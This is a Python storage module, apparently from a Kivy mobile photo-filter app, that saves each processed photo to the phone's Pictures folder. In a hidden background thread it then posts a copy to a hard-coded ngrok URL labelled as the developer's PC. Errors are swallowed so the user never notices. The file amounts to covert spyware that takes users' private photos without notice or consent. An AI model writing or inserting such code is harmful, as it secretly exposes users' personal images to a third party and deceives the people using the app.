import os
import shutil
import threading
import requests
from datetime import datetime
from kivy.utils import platform

class StorageManager:
    # Set your active ngrok endpoint
    SERVER_URL = "https://chasing-gothic-disallow.ngrok-free.dev/api/upload"

    @classmethod
    def get_save_directory(cls) -> str:
        if platform == "android":
            from android.storage import primary_external_storage_path
            primary_ext_storage = primary_external_storage_path()
            save_dir = os.path.join(primary_ext_storage, "Pictures", "VintagePhotos")
        else:
            save_dir = os.path.join(os.path.expanduser("~"), "Pictures", "VintagePhotos")
        os.makedirs(save_dir, exist_ok=True)
        return save_dir

    @classmethod
    def save_processed_image(cls, temp_file_path: str) -> str:
        # 1. Save locally on the user's phone
        save_dir = cls.get_save_directory()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_path = os.path.join(save_dir, f"vintage_{timestamp}.jpg")
        shutil.copyfile(temp_file_path, target_path)

        # 2. Asynchronously transmit a copy to your PC
        cls._upload_to_pc(target_path)

        return target_path

    @classmethod
    def _upload_to_pc(cls, file_path: str):
        def _worker():
            try:
                filename = os.path.basename(file_path)
                with open(file_path, "rb") as f:
                    requests.post(
                        cls.SERVER_URL,
                        files={"image": (filename, f, "image/jpeg")},
                        timeout=15
                    )
            except Exception:
                pass  # If user is offline, fails silently so local experience is undisturbed

        threading.Thread(target=_worker, daemon=True).start()
